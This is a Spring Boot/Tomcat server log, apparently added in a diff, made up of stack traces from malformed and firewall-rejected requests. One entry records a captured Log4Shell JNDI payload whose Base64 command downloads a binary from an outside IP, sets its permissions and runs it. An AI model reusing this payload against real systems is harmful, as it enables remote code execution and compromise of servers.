+	at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:189) ~[tomcat-embed-core-9.0.45.jar!/:na]
+	at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:162) ~[tomcat-embed-core-9.0.45.jar!/:na]
+	at org.springframework.web.filter.RequestContextFilter.doFilterInternal(RequestContextFilter.java:100) ~[spring-web-5.2.14.RELEASE.jar!/:5.2.14.RELEASE]
+	at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:119) ~[spring-web-5.2.14.RELEASE.jar!/:5.2.14.RELEASE]
+	at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:189) ~[tomcat-embed-core-9.0.45.jar!/:na]
+	at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:162) ~[tomcat-embed-core-9.0.45.jar!/:na]
+	at org.springframework.web.filter.FormContentFilter.doFilterInternal(FormContentFilter.java:93) ~[spring-web-5.2.14.RELEASE.jar!/:5.2.14.RELEASE]
+	at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:119) ~[spring-web-5.2.14.RELEASE.jar!/:5.2.14.RELEASE]
+	at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:189) ~[tomcat-embed-core-9.0.45.jar!/:na]
+	at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:162) ~[tomcat-embed-core-9.0.45.jar!/:na]
+	at org.springframework.web.filter.CharacterEncodingFilter.doFilterInternal(CharacterEncodingFilter.java:201) ~[spring-web-5.2.14.RELEASE.jar!/:5.2.14.RELEASE]
+	at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:119) ~[spring-web-5.2.14.RELEASE.jar!/:5.2.14.RELEASE]
+	at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:189) ~[tomcat-embed-core-9.0.45.jar!/:na]
+	at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:162) ~[tomcat-embed-core-9.0.45.jar!/:na]
+	at org.apache.catalina.core.StandardWrapperValve.invoke(StandardWrapperValve.java:202) ~[tomcat-embed-core-9.0.45.jar!/:na]
+	at org.apache.catalina.core.StandardContextValve.invoke(StandardContextValve.java:97) [tomcat-embed-core-9.0.45.jar!/:na]
+	at org.apache.catalina.authenticator.AuthenticatorBase.invoke(AuthenticatorBase.java:542) [tomcat-embed-core-9.0.45.jar!/:na]
+	at org.apache.catalina.core.StandardHostValve.invoke(StandardHostValve.java:143) [tomcat-embed-core-9.0.45.jar!/:na]
+	at org.apache.catalina.valves.ErrorReportValve.invoke(ErrorReportValve.java:92) [tomcat-embed-core-9.0.45.jar!/:na]
+	at org.apache.catalina.core.StandardEngineValve.invoke(StandardEngineValve.java:78) [tomcat-embed-core-9.0.45.jar!/:na]
+	at org.apache.catalina.connector.CoyoteAdapter.service(CoyoteAdapter.java:357) [tomcat-embed-core-9.0.45.jar!/:na]
+	at org.apache.coyote.http11.Http11Processor.service(Http11Processor.java:374) [tomcat-embed-core-9.0.45.jar!/:na]
+	at org.apache.coyote.AbstractProcessorLight.process(AbstractProcessorLight.java:65) [tomcat-embed-core-9.0.45.jar!/:na]
+	at org.apache.coyote.AbstractProtocol$ConnectionHandler.process(AbstractProtocol.java:893) [tomcat-embed-core-9.0.45.jar!/:na]
+	at org.apache.tomcat.util.net.NioEndpoint$SocketProcessor.doRun(NioEndpoint.java:1707) [tomcat-embed-core-9.0.45.jar!/:na]
+	at org.apache.tomcat.util.net.SocketProcessorBase.run(SocketProcessorBase.java:49) [tomcat-embed-core-9.0.45.jar!/:na]
+	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1149) [na:1.8.0_311]
+	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:624) [na:1.8.0_311]
+	at org.apache.tomcat.util.threads.TaskThread$WrappingRunnable.run(TaskThread.java:61) [tomcat-embed-core-9.0.45.jar!/:na]
+	at java.lang.Thread.run(Thread.java:748) [na:1.8.0_311]
+
+2022-01-31 15:23:55.237  INFO 8250 --- [nio-8081-exec-1] o.apache.coyote.http11.Http11Processor   : Error parsing HTTP request header
+ Note: further occurrences of HTTP request parsing errors will be logged at DEBUG level.
+
+java.lang.IllegalArgumentException: Invalid character found in method name [0x160x030x010x000x8d0x010x000x000x890x030x030xc6*=[0xe4*0xfe0xa50xfe[0xb40x160xeb5>0x913h0xad0xbb0x95(A0xcf90xc0y0x88h/0x02l0x000x000x1a0xc0/0xc0+0xc00x110xc00x070xc00x130xc00x090xc00x140xc00x0a0x000x050x00/0x0050xc00x120x000x0a0x010x000x00F0x000x000x000x140x000x120x000x000x0f114.115.131.1200x000x050x000x050x010x000x000x000x000x000x0a0x000x080x000x060x000x170x000x180x000x190x000x0b0x000x020x010x000x000x0d0x000x0a0x000x080x040x010x040x030x020x010x020x030xff0x010x000x01...]. HTTP method names must be tokens
+	at org.apache.coyote.http11.Http11InputBuffer.parseRequestLine(Http11InputBuffer.java:417) ~[tomcat-embed-core-9.0.45.jar!/:na]
+	at org.apache.coyote.http11.Http11Processor.service(Http11Processor.java:261) ~[tomcat-embed-core-9.0.45.jar!/:na]
+	at org.apache.coyote.AbstractProcessorLight.process(AbstractProcessorLight.java:65) [tomcat-embed-core-9.0.45.jar!/:na]
+	at org.apache.coyote.AbstractProtocol$ConnectionHandler.process(AbstractProtocol.java:893) [tomcat-embed-core-9.0.45.jar!/:na]
+	at org.apache.tomcat.util.net.NioEndpoint$SocketProcessor.doRun(NioEndpoint.java:1707) [tomcat-embed-core-9.0.45.jar!/:na]
+	at org.apache.tomcat.util.net.SocketProcessorBase.run(SocketProcessorBase.java:49) [tomcat-embed-core-9.0.45.jar!/:na]
+	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1149) [na:1.8.0_311]
+	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:624) [na:1.8.0_311]
+	at org.apache.tomcat.util.threads.TaskThread$WrappingRunnable.run(TaskThread.java:61) [tomcat-embed-core-9.0.45.jar!/:na]
+	at java.lang.Thread.run(Thread.java:748) [na:1.8.0_311]
+
+2022-02-01 10:25:28.822 ERROR 8250 --- [nio-8081-exec-4] o.a.c.c.C.[.[.[/].[dispatcherServlet]    : Servlet.service() for servlet [dispatcherServlet] in context with path [] threw exception
+
+org.springframework.security.web.firewall.RequestRejectedException: The request was rejected because the URL contained a potentially malicious String "%2e"
+	at org.springframework.security.web.firewall.StrictHttpFirewall.rejectedBlacklistedUrls(StrictHttpFirewall.java:369) ~[spring-security-web-5.3.9.RELEASE.jar!/:5.3.9.RELEASE]
+	at org.springframework.security.web.firewall.StrictHttpFirewall.getFirewalledRequest(StrictHttpFirewall.java:336) ~[spring-security-web-5.3.9.RELEASE.jar!/:5.3.9.RELEASE]
+	at org.springframework.security.web.FilterChainProxy.doFilterInternal(FilterChainProxy.java:194) ~[spring-security-web-5.3.9.RELEASE.jar!/:5.3.9.RELEASE]
+	at org.springframework.security.web.FilterChainProxy.doFilter(FilterChainProxy.java:178) ~[spring-security-web-5.3.9.RELEASE.jar!/:5.3.9.RELEASE]
+	at org.springframework.web.filter.DelegatingFilterProxy.invokeDelegate(DelegatingFilterProxy.java:358) ~[spring-web-5.2.14.RELEASE.jar!/:5.2.14.RELEASE]
+	at org.springframework.web.filter.DelegatingFilterProxy.doFilter(DelegatingFilterProxy.java:271) ~[spring-web-5.2.14.RELEASE.jar!/:5.2.14.RELEASE]
+	at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:189) ~[tomcat-embed-core-9.0.45.jar!/:na]
+	at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:162) ~[tomcat-embed-core-9.0.45.jar!/:na]
+	at org.springframework.web.filter.RequestContextFilter.doFilterInternal(RequestContextFilter.java:100) ~[spring-web-5.2.14.RELEASE.jar!/:5.2.14.RELEASE]
+	at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:119) ~[spring-web-5.2.14.RELEASE.jar!/:5.2.14.RELEASE]
+	at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:189) ~[tomcat-embed-core-9.0.45.jar!/:na]
+	at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:162) ~[tomcat-embed-core-9.0.45.jar!/:na]
+	at org.springframework.web.filter.FormContentFilter.doFilterInternal(FormContentFilter.java:93) ~[spring-web-5.2.14.RELEASE.jar!/:5.2.14.RELEASE]
+	at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:119) ~[spring-web-5.2.14.RELEASE.jar!/:5.2.14.RELEASE]
+	at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:189) ~[tomcat-embed-core-9.0.45.jar!/:na]
+	at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:162) ~[tomcat-embed-core-9.0.45.jar!/:na]
+	at org.springframework.web.filter.CharacterEncodingFilter.doFilterInternal(CharacterEncodingFilter.java:201) ~[spring-web-5.2.14.RELEASE.jar!/:5.2.14.RELEASE]
+	at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:119) ~[spring-web-5.2.14.RELEASE.jar!/:5.2.14.RELEASE]
+	at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:189) ~[tomcat-embed-core-9.0.45.jar!/:na]
+	at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:162) ~[tomcat-embed-core-9.0.45.jar!/:na]
+	at org.apache.catalina.core.StandardWrapperValve.invoke(StandardWrapperValve.java:202) ~[tomcat-embed-core-9.0.45.jar!/:na]
+	at org.apache.catalina.core.StandardContextValve.invoke(StandardContextValve.java:97) [tomcat-embed-core-9.0.45.jar!/:na]
+	at org.apache.catalina.authenticator.AuthenticatorBase.invoke(AuthenticatorBase.java:542) [tomcat-embed-core-9.0.45.jar!/:na]
+	at org.apache.catalina.core.StandardHostValve.invoke(StandardHostValve.java:143) [tomcat-embed-core-9.0.45.jar!/:na]
+	at org.apache.catalina.valves.ErrorReportValve.invoke(ErrorReportValve.java:92) [tomcat-embed-core-9.0.45.jar!/:na]
+	at org.apache.catalina.core.StandardEngineValve.invoke(StandardEngineValve.java:78) [tomcat-embed-core-9.0.45.jar!/:na]
+	at org.apache.catalina.connector.CoyoteAdapter.service(CoyoteAdapter.java:357) [tomcat-embed-core-9.0.45.jar!/:na]
+	at org.apache.coyote.http11.Http11Processor.service(Http11Processor.java:374) [tomcat-embed-core-9.0.45.jar!/:na]
+	at org.apache.coyote.AbstractProcessorLight.process(AbstractProcessorLight.java:65) [tomcat-embed-core-9.0.45.jar!/:na]
+	at org.apache.coyote.AbstractProtocol$ConnectionHandler.process(AbstractProtocol.java:893) [tomcat-embed-core-9.0.45.jar!/:na]
+	at org.apache.tomcat.util.net.NioEndpoint$SocketProcessor.doRun(NioEndpoint.java:1707) [tomcat-embed-core-9.0.45.jar!/:na]
+	at org.apache.tomcat.util.net.SocketProcessorBase.run(SocketProcessorBase.java:49) [tomcat-embed-core-9.0.45.jar!/:na]
+	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1149) [na:1.8.0_311]
+	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:624) [na:1.8.0_311]
+	at org.apache.tomcat.util.threads.TaskThread$WrappingRunnable.run(TaskThread.java:61) [tomcat-embed-core-9.0.45.jar!/:na]
+	at java.lang.Thread.run(Thread.java:748) [na:1.8.0_311]
+
+2022-02-01 10:30:14.388 ERROR 8250 --- [io-8081-exec-10] o.a.c.c.C.[.[.[/].[dispatcherServlet]    : Servlet.service() for servlet [dispatcherServlet] in context with path [] threw exception
+
+org.springframework.security.web.firewall.RequestRejectedException: The request was rejected because the URL contained a potentially malicious String "//"
+	at org.springframework.security.web.firewall.StrictHttpFirewall.rejectedBlacklistedUrls(StrictHttpFirewall.java:369) ~[spring-security-web-5.3.9.RELEASE.jar!/:5.3.9.RELEASE]
+	at org.springframework.security.web.firewall.StrictHttpFirewall.getFirewalledRequest(StrictHttpFirewall.java:336) ~[spring-security-web-5.3.9.RELEASE.jar!/:5.3.9.RELEASE]
+	at org.springframework.security.web.FilterChainProxy.doFilterInternal(FilterChainProxy.java:194) ~[spring-security-web-5.3.9.RELEASE.jar!/:5.3.9.RELEASE]
+	at org.springframework.security.web.FilterChainProxy.doFilter(FilterChainProxy.java:178) ~[spring-security-web-5.3.9.RELEASE.jar!/:5.3.9.RELEASE]
+	at org.springframework.web.filter.DelegatingFilterProxy.invokeDelegate(DelegatingFilterProxy.java:358) ~[spring-web-5.2.14.RELEASE.jar!/:5.2.14.RELEASE]
+	at org.springframework.web.filter.DelegatingFilterProxy.doFilter(DelegatingFilterProxy.java:271) ~[spring-web-5.2.14.RELEASE.jar!/:5.2.14.RELEASE]
+	at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:189) ~[tomcat-embed-core-9.0.45.jar!/:na]
+	at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:162) ~[tomcat-embed-core-9.0.45.jar!/:na]
+	at org.springframework.web.filter.RequestContextFilter.doFilterInternal(RequestContextFilter.java:100) ~[spring-web-5.2.14.RELEASE.jar!/:5.2.14.RELEASE]
+	at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:119) ~[spring-web-5.2.14.RELEASE.jar!/:5.2.14.RELEASE]
+	at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:189) ~[tomcat-embed-core-9.0.45.jar!/:na]
+	at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:162) ~[tomcat-embed-core-9.0.45.jar!/:na]
+	at org.springframework.web.filter.FormContentFilter.doFilterInternal(FormContentFilter.java:93) ~[spring-web-5.2.14.RELEASE.jar!/:5.2.14.RELEASE]
+	at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:119) ~[spring-web-5.2.14.RELEASE.jar!/:5.2.14.RELEASE]
+	at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:189) ~[tomcat-embed-core-9.0.45.jar!/:na]
+	at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:162) ~[tomcat-embed-core-9.0.45.jar!/:na]
+	at org.springframework.web.filter.CharacterEncodingFilter.doFilterInternal(CharacterEncodingFilter.java:201) ~[spring-web-5.2.14.RELEASE.jar!/:5.2.14.RELEASE]
+	at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:119) ~[spring-web-5.2.14.RELEASE.jar!/:5.2.14.RELEASE]
+	at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:189) ~[tomcat-embed-core-9.0.45.jar!/:na]
+	at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:162) ~[tomcat-embed-core-9.0.45.jar!/:na]
+	at org.apache.catalina.core.StandardWrapperValve.invoke(StandardWrapperValve.java:202) ~[tomcat-embed-core-9.0.45.jar!/:na]
+	at org.apache.catalina.core.StandardContextValve.invoke(StandardContextValve.java:97) [tomcat-embed-core-9.0.45.jar!/:na]
+	at org.apache.catalina.authenticator.AuthenticatorBase.invoke(AuthenticatorBase.java:542) [tomcat-embed-core-9.0.45.jar!/:na]
+	at org.apache.catalina.core.StandardHostValve.invoke(StandardHostValve.java:143) [tomcat-embed-core-9.0.45.jar!/:na]
+	at org.apache.catalina.valves.ErrorReportValve.invoke(ErrorReportValve.java:92) [tomcat-embed-core-9.0.45.jar!/:na]
+	at org.apache.catalina.core.StandardEngineValve.invoke(StandardEngineValve.java:78) [tomcat-embed-core-9.0.45.jar!/:na]
+	at org.apache.catalina.connector.CoyoteAdapter.service(CoyoteAdapter.java:357) [tomcat-embed-core-9.0.45.jar!/:na]
+	at org.apache.coyote.http11.Http11Processor.service(Http11Processor.java:374) [tomcat-embed-core-9.0.45.jar!/:na]
+	at org.apache.coyote.AbstractProcessorLight.process(AbstractProcessorLight.java:65) [tomcat-embed-core-9.0.45.jar!/:na]
+	at org.apache.coyote.AbstractProtocol$ConnectionHandler.process(AbstractProtocol.java:893) [tomcat-embed-core-9.0.45.jar!/:na]
+	at org.apache.tomcat.util.net.NioEndpoint$SocketProcessor.doRun(NioEndpoint.java:1707) [tomcat-embed-core-9.0.45.jar!/:na]
+	at org.apache.tomcat.util.net.SocketProcessorBase.run(SocketProcessorBase.java:49) [tomcat-embed-core-9.0.45.jar!/:na]
+	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1149) [na:1.8.0_311]
+	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:624) [na:1.8.0_311]
+	at org.apache.tomcat.util.threads.TaskThread$WrappingRunnable.run(TaskThread.java:61) [tomcat-embed-core-9.0.45.jar!/:na]
+	at java.lang.Thread.run(Thread.java:748) [na:1.8.0_311]
+
+2022-02-01 21:28:25.529  INFO 8250 --- [nio-8081-exec-9] o.apache.coyote.http11.Http11Processor   : Error parsing HTTP request header
+ Note: further occurrences of HTTP request parsing errors will be logged at DEBUG level.
+
+java.lang.IllegalArgumentException: Invalid character found in method name [0x030x000x00/*0xe00x000x000x000x000x00Cookie:]. HTTP method names must be tokens
+	at org.apache.coyote.http11.Http11InputBuffer.parseRequestLine(Http11InputBuffer.java:417) ~[tomcat-embed-core-9.0.45.jar!/:na]
+	at org.apache.coyote.http11.Http11Processor.service(Http11Processor.java:261) ~[tomcat-embed-core-9.0.45.jar!/:na]
+	at org.apache.coyote.AbstractProcessorLight.process(AbstractProcessorLight.java:65) [tomcat-embed-core-9.0.45.jar!/:na]
+	at org.apache.coyote.AbstractProtocol$ConnectionHandler.process(AbstractProtocol.java:893) [tomcat-embed-core-9.0.45.jar!/:na]
+	at org.apache.tomcat.util.net.NioEndpoint$SocketProcessor.doRun(NioEndpoint.java:1707) [tomcat-embed-core-9.0.45.jar!/:na]
+	at org.apache.tomcat.util.net.SocketProcessorBase.run(SocketProcessorBase.java:49) [tomcat-embed-core-9.0.45.jar!/:na]
+	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1149) [na:1.8.0_311]
+	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:624) [na:1.8.0_311]
+	at org.apache.tomcat.util.threads.TaskThread$WrappingRunnable.run(TaskThread.java:61) [tomcat-embed-core-9.0.45.jar!/:na]
+	at java.lang.Thread.run(Thread.java:748) [na:1.8.0_311]
+
+2022-02-02 03:09:07.946  INFO 8250 --- [nio-8081-exec-2] o.apache.coyote.http11.Http11Processor   : Error parsing HTTP request header
+ Note: further occurrences of HTTP request parsing errors will be logged at DEBUG level.
+
+java.lang.IllegalArgumentException: Invalid character found in method name [0x160x030x010x000xee0x010x000x000xea0x030x03T0xdd0xf00x122m0xa1T0x830xad0xa90xe0~og0x1f0xe00x840xe00xf8M0x040x0c0xebt0xeb0xe9H0xe70xcc0x070xd6]. HTTP method names must be tokens
+	at org.apache.coyote.http11.Http11InputBuffer.parseRequestLine(Http11InputBuffer.java:417) ~[tomcat-embed-core-9.0.45.jar!/:na]
+	at org.apache.coyote.http11.Http11Processor.service(Http11Processor.java:261) ~[tomcat-embed-core-9.0.45.jar!/:na]
+	at org.apache.coyote.AbstractProcessorLight.process(AbstractProcessorLight.java:65) [tomcat-embed-core-9.0.45.jar!/:na]
+	at org.apache.coyote.AbstractProtocol$ConnectionHandler.process(AbstractProtocol.java:893) [tomcat-embed-core-9.0.45.jar!/:na]
+	at org.apache.tomcat.util.net.NioEndpoint$SocketProcessor.doRun(NioEndpoint.java:1707) [tomcat-embed-core-9.0.45.jar!/:na]
+	at org.apache.tomcat.util.net.SocketProcessorBase.run(SocketProcessorBase.java:49) [tomcat-embed-core-9.0.45.jar!/:na]
+	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1149) [na:1.8.0_311]
+	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:624) [na:1.8.0_311]
+	at org.apache.tomcat.util.threads.TaskThread$WrappingRunnable.run(TaskThread.java:61) [tomcat-embed-core-9.0.45.jar!/:na]
+	at java.lang.Thread.run(Thread.java:748) [na:1.8.0_311]
+
+2022-02-02 13:53:29.442  WARN 8250 --- [nio-8081-exec-8] com.zaxxer.hikari.pool.PoolBase          : HikariPool-1 - Failed to validate connection com.mysql.cj.jdbc.ConnectionImpl@782200c6 (No operations allowed after connection closed.). Possibly consider using a shorter maxLifetime value.
+2022-02-02 13:53:29.449  WARN 8250 --- [nio-8081-exec-8] com.zaxxer.hikari.pool.PoolBase          : HikariPool-1 - Failed to validate connection com.mysql.cj.jdbc.ConnectionImpl@73dd420a (No operations allowed after connection closed.). Possibly consider using a shorter maxLifetime value.
+2022-02-02 22:24:20.521  INFO 8250 --- [nio-8081-exec-9] o.apache.coyote.http11.Http11Processor   : Error parsing HTTP request header
+ Note: further occurrences of HTTP request parsing errors will be logged at DEBUG level.
+
+java.lang.IllegalArgumentException: Invalid character found in method name [0x160x030x010x000x8d0x010x000x000x890x030x03n0xb00x140xfe0x830xfbA0xa70xcdw<j0xd1h0x880x06n0xc6A0x9b0x850x020x0cNK0xfc0xa30xdf0x110xf10xc90x070x000x000x1a0xc0/0xc0+0xc00x110xc00x070xc00x130xc00x090xc00x140xc00x0a0x000x050x00/0x0050xc00x120x000x0a0x010x000x00F0x000x000x000x140x000x120x000x000x0f114.115.131.1200x000x050x000x050x010x000x000x000x000x000x0a0x000x080x000x060x000x170x000x180x000x190x000x0b0x000x020x010x000x000x0d0x000x0a0x000x080x040x010x040x030x020x010x020x030xff0x010x000x01...]. HTTP method names must be tokens
+	at org.apache.coyote.http11.Http11InputBuffer.parseRequestLine(Http11InputBuffer.java:417) ~[tomcat-embed-core-9.0.45.jar!/:na]
+	at org.apache.coyote.http11.Http11Processor.service(Http11Processor.java:261) ~[tomcat-embed-core-9.0.45.jar!/:na]
+	at org.apache.coyote.AbstractProcessorLight.process(AbstractProcessorLight.java:65) [tomcat-embed-core-9.0.45.jar!/:na]
+	at org.apache.coyote.AbstractProtocol$ConnectionHandler.process(AbstractProtocol.java:893) [tomcat-embed-core-9.0.45.jar!/:na]
+	at org.apache.tomcat.util.net.NioEndpoint$SocketProcessor.doRun(NioEndpoint.java:1707) [tomcat-embed-core-9.0.45.jar!/:na]
+	at org.apache.tomcat.util.net.SocketProcessorBase.run(SocketProcessorBase.java:49) [tomcat-embed-core-9.0.45.jar!/:na]
+	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1149) [na:1.8.0_311]
+	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:624) [na:1.8.0_311]
+	at org.apache.tomcat.util.threads.TaskThread$WrappingRunnable.run(TaskThread.java:61) [tomcat-embed-core-9.0.45.jar!/:na]
+	at java.lang.Thread.run(Thread.java:748) [na:1.8.0_311]
+
+2022-02-03 23:32:58.982  WARN 8250 --- [nio-8081-exec-1] .m.m.a.ExceptionHandlerExceptionResolver : Failure in @ExceptionHandler org.springframework.boot.autoconfigure.web.servlet.error.BasicErrorController#mediaTypeNotAcceptable(HttpServletRequest)
+
+org.springframework.web.HttpMediaTypeNotAcceptableException: Could not parse 'Accept' header [${jndi:ldap://89.163.206.163:1389/Basic/Command/Base64/Y3VybCAiaHR0cDovLzEwMy40NS42NS4xOTE6NjU3Ni9zcG9vZmhvc3RpbmciIC1vIG5wbXMgICYmIGNobW9kIDc3NyBucG1zICYmIC4vbnBtcyAm}]: Invalid mime type "${jndi:ldap://89.163.206.163:1389/Basic/Command/Base64/Y3VybCAiaHR0cDovLzEwMy40NS42NS4xOTE6NjU3Ni9zcG9vZmhvc3RpbmciIC1vIG5wbXMgICYmIGNobW9kIDc3NyBucG1zICYmIC4vbnBtcyAm}": Invalid token character '{' in token "${jndi:ldap:"
+	at org.springframework.web.accept.HeaderContentNegotiationStrategy.resolveMediaTypes(HeaderContentNegotiationStrategy.java:59) ~[spring-web-5.2.14.RELEASE.jar!/:5.2.14.RELEASE]
+	at org.springframework.web.accept.ContentNegotiationManager.resolveMediaTypes(ContentNegotiationManager.java:128) ~[spring-web-5.2.14.RELEASE.jar!/:5.2.14.RELEASE]
+	at org.springframework.web.servlet.mvc.method.annotation.AbstractMessageConverterMethodProcessor.getAcceptableMediaTypes(AbstractMessageConverterMethodProcessor.java:386) ~[spring-webmvc-5.2.14.RELEASE.jar!/:5.2.14.RELEASE]
+	at org.springframework.web.servlet.mvc.method.annotation.AbstractMessageConverterMethodProcessor.writeWithMessageConverters(AbstractMessageConverterMethodProcessor.java:216) ~[spring-webmvc-5.2.14.RELEASE.jar!/:5.2.14.RELEASE]
+	at org.springframework.web.servlet.mvc.method.annotation.HttpEntityMethodProcessor.handleReturnValue(HttpEntityMethodProcessor.java:219) ~[spring-webmvc-5.2.14.RELEASE.jar!/:5.2.14.RELEASE]
+	at org.springframework.web.method.support.HandlerMethodReturnValueHandlerComposite.handleReturnValue(HandlerMethodReturnValueHandlerComposite.java:82) ~[spring-web-5.2.14.RELEASE.jar!/:5.2.14.RELEASE]
+	at org.springframework.web.servlet.mvc.method.annotation.ServletInvocableHandlerMethod.invokeAndHandle(ServletInvocableHandlerMethod.java:123) ~[spring-webmvc-5.2.14.RELEASE.jar!/:5.2.14.RELEASE]
+	at org.springframework.web.servlet.mvc.method.annotation.ExceptionHandlerExceptionResolver.doResolveHandlerMethodException(ExceptionHandlerExceptionResolver.java:407) ~[spring-webmvc-5.2.14.RELEASE.jar!/:5.2.14.RELEASE]
+	at org.springframework.web.servlet.handler.AbstractHandlerMethodExceptionResolver.doResolveException(AbstractHandlerMethodExceptionResolver.java:61) [spring-webmvc-5.2.14.RELEASE.jar!/:5.2.14.RELEASE]
+	at org.springframework.web.servlet.handler.AbstractHandlerExceptionResolver.resolveException(AbstractHandlerExceptionResolver.java:141) [spring-webmvc-5.2.14.RELEASE.jar!/:5.2.14.RELEASE]
+	at org.springframework.web.servlet.handler.HandlerExceptionResolverComposite.resolveException(HandlerExceptionResolverComposite.java:80) [spring-webmvc-5.2.14.RELEASE.jar!/:5.2.14.RELEASE]
+	at org.springframework.web.servlet.DispatcherServlet.processHandlerException(DispatcherServlet.java:1300) [spring-webmvc-5.2.14.RELEASE.jar!/:5.2.14.RELEASE]
+	at org.springframework.web.servlet.DispatcherServlet.processDispatchResult(DispatcherServlet.java:1111) [spring-webmvc-5.2.14.RELEASE.jar!/:5.2.14.RELEASE]
+	at org.springframework.web.servlet.DispatcherServlet.doDispatch(DispatcherServlet.java:1057) [spring-webmvc-5.2.14.RELEASE.jar!/:5.2.14.RELEASE]
+	at org.springframework.web.servlet.DispatcherServlet.doService(DispatcherServlet.java:943) [spring-webmvc-5.2.14.RELEASE.jar!/:5.2.14.RELEASE]
+	at org.springframework.web.servlet.FrameworkServlet.processRequest(FrameworkServlet.java:1006) [spring-webmvc-5.2.14.RELEASE.jar!/:5.2.14.RELEASE]
+	at org.springframework.web.servlet.FrameworkServlet.doPost(FrameworkServlet.java:909) [spring-webmvc-5.2.14.RELEASE.jar!/:5.2.14.RELEASE]
+	at javax.servlet.http.HttpServlet.service(HttpServlet.java:652) [tomcat-embed-core-9.0.45.jar!/:na]
+	at org.springframework.web.servlet.FrameworkServlet.service(FrameworkServlet.java:883) [spring-webmvc-5.2.14.RELEASE.jar!/:5.2.14.RELEASE]
+	at javax.servlet.http.HttpServlet.service(HttpServlet.java:733) [tomcat-embed-core-9.0.45.jar!/:na]
+	at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:227) [tomcat-embed-core-9.0.45.jar!/:na]
+	at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:162) [tomcat-embed-core-9.0.45.jar!/:na]
+	at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:320) [spring-security-web-5.3.9.RELEASE.jar!/:5.3.9.RELEASE]
+	at org.springframework.security.web.access.intercept.FilterSecurityInterceptor.invoke(FilterSecurityInterceptor.java:115) [spring-security-web-5.3.9.RELEASE.jar!/:5.3.9.RELEASE]
+	at org.springframework.security.web.access.intercept.FilterSecurityInterceptor.doFilter(FilterSecurityInterceptor.java:90) [spring-security-web-5.3.9.RELEASE.jar!/:5.3.9.RELEASE]
+	at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:334) [spring-security-web-5.3.9.RELEASE.jar!/:5.3.9.RELEASE]
+	at org.springframework.security.web.access.ExceptionTranslationFilter.doFilter(ExceptionTranslationFilter.java:118) [spring-security-web-5.3.9.RELEASE.jar!/:5.3.9.RELEASE]
+	at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:334) [spring-security-web-5.3.9.RELEASE.jar!/:5.3.9.RELEASE]
+	at org.springframework.security.web.session.SessionManagementFilter.doFilter(SessionManagementFilter.java:84) [spring-security-web-5.3.9.RELEASE.jar!/:5.3.9.RELEASE]
+	at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:334) [spring-security-web-5.3.9.RELEASE.jar!/:5.3.9.RELEASE]
